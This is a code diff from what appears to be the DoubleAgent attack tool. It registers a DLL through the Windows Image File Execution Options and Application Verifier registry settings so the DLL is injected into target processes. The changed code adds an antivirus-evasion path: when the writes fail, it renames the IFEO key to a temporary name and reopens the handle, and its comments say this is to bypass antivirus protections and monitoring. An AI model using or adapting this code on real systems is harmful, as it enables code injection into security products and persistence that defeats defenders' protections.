@@ -168,7 +168,7 @@ DOUBLEAGENT_STATUS VERIFIER_Repair(VOID)
 	 * In some cases (application crash, exception, etc.) the install\uninstall functions may accidentally leave the IFEO key with its temporary name
 	 * Checks if the temporary name exists
 	 */
-	lOpenKeyStatus = RegOpenKeyExW(HKEY_LOCAL_MACHINE, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_SUB_KEY_TEMP, KEY_WOW64_64KEY, KEY_ALL_ACCESS, &hIfeoKey);
+	lOpenKeyStatus = RegOpenKeyExW(HKEY_LOCAL_MACHINE, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_SUB_KEY_TEMP, 0, KEY_WRITE | KEY_WOW64_64KEY, &hIfeoKey);
 	if (ERROR_SUCCESS == lOpenKeyStatus)
 	{
 		/* Repairs the IFEO key by restoring it to its original name */
@@ -254,55 +254,84 @@ static DOUBLEAGENT_STATUS verifier_Register(IN PCWSTR pcwszProcessName, IN PCWST
 {
 	DOUBLEAGENT_STATUS eStatus = DOUBLEAGENT_STATUS_INVALID_VALUE;
 	HKEY hIfeoKey = NULL;
+	HKEY hIfeoKeyTemp = NULL;
 	DWORD dwGlobalFlag = VERIFIER_FLG_APPLICATION_VERIFIER;
 	DWORD dwVrfDllNameLenInBytes = 0;
 	BOOL bKeyRenamed = FALSE;
 	BOOL bCreatedVerifierDlls = FALSE;
+	BOOL bCreatedVerifierDllsTemp = FALSE;
 	BOOL bCreatedGlobalFlag = FALSE;
+	BOOL bCreatedGlobalFlagTemp = FALSE;
 
 	/* Validates the parameters */
 	_ASSERT(NULL != pcwszProcessName);
 	_ASSERT(NULL != pcwszVrfDllName);
 
-	/* Opens the IFEO key */
-	if (ERROR_SUCCESS != RegOpenKeyExW(HKEY_LOCAL_MACHINE, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_SUB_KEY, KEY_WOW64_64KEY, KEY_ALL_ACCESS, &hIfeoKey))
-	{
-		DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_REGISTER_REGOPENKEYEXW_FAILED);
-		goto lbl_cleanup;
-	}
-
-	/*
-	 * Renames the IFEO key name to a temporary name
-	 * This step is done to bypass the protection of some anti-viruses that protect the keys of their processes under IFEO
-	 */
-	if (ERROR_SUCCESS != RegRenameKey(hIfeoKey, NULL, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_NAME_TEMP))
-	{
-		DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_REGISTER_REGRENAMEKEY_FAILED);
-		goto lbl_cleanup;
-	}
-	bKeyRenamed = TRUE;
-
 	/* Gets the verifier dll name length in bytes */
 	dwVrfDllNameLenInBytes = (DWORD)(wcslen(pcwszVrfDllName) + 1) * sizeof(*pcwszVrfDllName);
 
-	/* Creates the VerifierDlls value and sets it to the verifier dll name */
-	if (ERROR_SUCCESS != RegSetKeyValueW(hIfeoKey, pcwszProcessName, VERIFIER_VERIFIERDLLS_VALUE_NAME, REG_SZ, pcwszVrfDllName, dwVrfDllNameLenInBytes))
+	/* Opens the IFEO key */
+	if (ERROR_SUCCESS != RegOpenKeyExW(HKEY_LOCAL_MACHINE, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_SUB_KEY, 0, KEY_WRITE | KEY_SET_VALUE | KEY_WOW64_64KEY, &hIfeoKey))
 	{
-		DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_REGISTER_REGSETKEYVALUEW_FAILED_VERIFIERDLLS);
+		DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_REGISTER_REGOPENKEYEXW_FAILED_IFEO);
 		goto lbl_cleanup;
 	}
-	bCreatedVerifierDlls = TRUE;
+
+	/* Creates the VerifierDlls value and sets it to the verifier dll name */
+	bCreatedVerifierDlls = (ERROR_SUCCESS == RegSetKeyValueW(hIfeoKey, pcwszProcessName, VERIFIER_VERIFIERDLLS_VALUE_NAME, REG_SZ, pcwszVrfDllName, dwVrfDllNameLenInBytes));
 
 	/*
 	 * Creates the GlobalFlag value and sets it to FLG_APPLICATION_VERIFIER
 	 * Read more: https://msdn.microsoft.com/en-us/library/windows/hardware/ff542875(v=vs.85).aspx
 	 */
-	if (ERROR_SUCCESS != RegSetKeyValueW(hIfeoKey, pcwszProcessName, VERIFIER_GLOBALFLAG_VALUE_NAME, REG_DWORD, &dwGlobalFlag, sizeof(dwGlobalFlag)))
+	bCreatedGlobalFlag = (ERROR_SUCCESS == RegSetKeyValueW(hIfeoKey, pcwszProcessName, VERIFIER_GLOBALFLAG_VALUE_NAME, REG_DWORD, &dwGlobalFlag, sizeof(dwGlobalFlag)));
+
+	/*
+	 * The key creation might fail because some antiviruses protect the keys of their processes under the IFEO
+	 * One possible bypass is to rename the IFEO key name to a temporary name, create the keys, and restores the IFEO key name
+	 */
+	if ((FALSE == bCreatedVerifierDlls) || (FALSE == bCreatedGlobalFlag))
 	{
-		DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_REGISTER_REGSETKEYVALUEW_FAILED_GLOBALFLAG);
-		goto lbl_cleanup;
+		/* Renames the IFEO key name to a temporary name */
+		if (ERROR_SUCCESS != RegRenameKey(hIfeoKey, NULL, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_NAME_TEMP))
+		{
+			DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_REGISTER_REGRENAMEKEY_FAILED);
+			goto lbl_cleanup;
+		}
+		bKeyRenamed = TRUE;
+
+		/*
+		 * Opens the temporary IFEO key
+		 * The key is reopened because some antiviruses continue monitoring and blocking the handle that opened the original IFEO
+		 */
+		if (ERROR_SUCCESS != RegOpenKeyExW(HKEY_LOCAL_MACHINE, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_SUB_KEY_TEMP, 0, KEY_SET_VALUE | KEY_WOW64_64KEY, &hIfeoKeyTemp))
+		{
+			DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_REGISTER_REGOPENKEYEXW_FAILED_TEMP_IFEO);
+			goto lbl_cleanup;
+		}
+
+		if (FALSE == bCreatedVerifierDlls)
+		{
+			/* Tries again to create the VerifierDlls value */
+			if (ERROR_SUCCESS != RegSetKeyValueW(hIfeoKeyTemp, pcwszProcessName, VERIFIER_VERIFIERDLLS_VALUE_NAME, REG_SZ, pcwszVrfDllName, dwVrfDllNameLenInBytes))
+			{
+				DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_REGISTER_REGSETKEYVALUEW_FAILED_VERIFIERDLLS);
+				goto lbl_cleanup;
+			}
+			bCreatedVerifierDllsTemp = TRUE;
+		}
+
+		if (FALSE == bCreatedGlobalFlag)
+		{
+			/* Tries again to create the GlobalFlag value */
+			if (ERROR_SUCCESS != RegSetKeyValueW(hIfeoKeyTemp, pcwszProcessName, VERIFIER_GLOBALFLAG_VALUE_NAME, REG_DWORD, &dwGlobalFlag, sizeof(dwGlobalFlag)))
+			{
+				DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_REGISTER_REGSETKEYVALUEW_FAILED_GLOBALFLAG);
+				goto lbl_cleanup;
+			}
+			bCreatedGlobalFlagTemp = TRUE;
+		}
 	}
-	bCreatedGlobalFlag = TRUE;
 
 	/* Succeeded */
 	DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_SUCCESS);
@@ -311,6 +340,20 @@ lbl_cleanup:
 	/* If failed, reverts the changes */
 	if (FALSE == DOUBLEAGENT_SUCCESS(eStatus))
 	{
+		/* Deletes the GlobalFlag temp value */
+		if (FALSE != bCreatedGlobalFlagTemp)
+		{
+			(VOID)RegDeleteKeyValueW(hIfeoKeyTemp, pcwszProcessName, VERIFIER_GLOBALFLAG_VALUE_NAME);
+			bCreatedGlobalFlagTemp = FALSE;
+		}
+
+		/* Deletes the VerifierDlls temp value */
+		if (FALSE != bCreatedVerifierDllsTemp)
+		{
+			(VOID)RegDeleteKeyValueW(hIfeoKeyTemp, pcwszProcessName, VERIFIER_VERIFIERDLLS_VALUE_NAME);
+			bCreatedVerifierDllsTemp = FALSE;
+		}
+
 		/* Deletes the GlobalFlag value */
 		if (FALSE != bCreatedGlobalFlag)
 		{
@@ -324,6 +367,13 @@ lbl_cleanup:
 			(VOID)RegDeleteKeyValueW(hIfeoKey, pcwszProcessName, VERIFIER_VERIFIERDLLS_VALUE_NAME);
 			bCreatedVerifierDlls = FALSE;
 		}
+	}
+
+	/* Closes the temporary IFEO key */
+	if (NULL != hIfeoKeyTemp)
+	{
+		(VOID)RegCloseKey(hIfeoKeyTemp);
+		hIfeoKeyTemp = NULL;
 	}
 
 	/* Restores the IFEO key name */
@@ -347,31 +397,59 @@ lbl_cleanup:
 static VOID verifier_Unregister(IN PCWSTR pcwszProcessName)
 {
 	HKEY hIfeoKey = NULL;
-	BOOL bKeyRenamed = FALSE;
+	HKEY hIfeoKeyTemp = NULL;
+	BOOL bDeletedVerifierDlls = FALSE;
+	BOOL bDeletedGlobalFlag = FALSE;
 
 	/* Validates the parameters */
 	_ASSERT(NULL != pcwszProcessName);
 
 	/* Opens the IFEO key */
-	if (ERROR_SUCCESS == RegOpenKeyExW(HKEY_LOCAL_MACHINE, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_SUB_KEY, KEY_WOW64_64KEY, KEY_ALL_ACCESS, &hIfeoKey))
+	if (ERROR_SUCCESS == RegOpenKeyExW(HKEY_LOCAL_MACHINE, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_SUB_KEY, 0, KEY_WRITE | KEY_SET_VALUE | KEY_WOW64_64KEY, &hIfeoKey))
 	{
-		/*
-		 * Renames the IFEO key name to a temporary name
-		 * This step is done to bypass the protection of some anti-viruses that protect the keys of their processes under IFEO
-		 */
-		bKeyRenamed = (ERROR_SUCCESS == RegRenameKey(hIfeoKey, NULL, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_NAME_TEMP));
-
 		/* Deletes the VerifierDlls value */
-		(VOID)RegDeleteKeyValueW(hIfeoKey, pcwszProcessName, VERIFIER_VERIFIERDLLS_VALUE_NAME);
+		bDeletedVerifierDlls = (ERROR_SUCCESS == RegDeleteKeyValueW(hIfeoKey, pcwszProcessName, VERIFIER_VERIFIERDLLS_VALUE_NAME));
 
 		/* Deletes the GlobalFlag value */
-		(VOID)RegDeleteKeyValueW(hIfeoKey, pcwszProcessName, VERIFIER_GLOBALFLAG_VALUE_NAME);
+		bDeletedGlobalFlag = (ERROR_SUCCESS == RegDeleteKeyValueW(hIfeoKey, pcwszProcessName, VERIFIER_GLOBALFLAG_VALUE_NAME));
 
-		/* Restores the IFEO key name */
-		if (FALSE != bKeyRenamed)
+		/*
+		 * The key deletion might fail because some antiviruses protect the keys of their processes under the IFEO
+		 * One possible bypass is to rename the IFEO key name to a temporary name, delete the keys, and restores the IFEO key name
+		 */
+		if ((FALSE == bDeletedVerifierDlls) || (FALSE == bDeletedGlobalFlag))
 		{
-			(VOID)RegRenameKey(hIfeoKey, NULL, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_NAME);
-			bKeyRenamed = FALSE;
+			/* Renames the IFEO key name to a temporary name */
+			if (ERROR_SUCCESS == RegRenameKey(hIfeoKey, NULL, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_NAME_TEMP))
+			{
+				/*
+				 * Opens the temporary IFEO key
+				 * The key is reopened because some antiviruses continue monitoring and blocking the handle that opened the original IFEO
+				 */
+				if (ERROR_SUCCESS == RegOpenKeyExW(HKEY_LOCAL_MACHINE, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_SUB_KEY_TEMP, 0, KEY_SET_VALUE | KEY_WOW64_64KEY, &hIfeoKeyTemp))
+				{
+					/* Tries again to delete the VerifierDlls value */
+					if (FALSE == bDeletedVerifierDlls)
+					{
+						(VOID)RegDeleteKeyValueW(hIfeoKeyTemp, pcwszProcessName, VERIFIER_VERIFIERDLLS_VALUE_NAME);
+						bDeletedVerifierDlls = TRUE;
+					}
+
+					/* Tries again to delete the GlobalFlag value */
+					if (FALSE == bDeletedGlobalFlag)
+					{
+						(VOID)RegDeleteKeyValueW(hIfeoKeyTemp, pcwszProcessName, VERIFIER_GLOBALFLAG_VALUE_NAME);
+						bDeletedGlobalFlag = TRUE;
+					}
+
+					/* Closes the temporary IFEO key */
+					(VOID)RegCloseKey(hIfeoKeyTemp);
+					hIfeoKeyTemp = NULL;
+				}
+
+				/* Restores the IFEO key name */
+				(VOID)RegRenameKey(hIfeoKey, NULL, VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_NAME);
+			}
 		}
 
 		/* Closes the IFEO key */
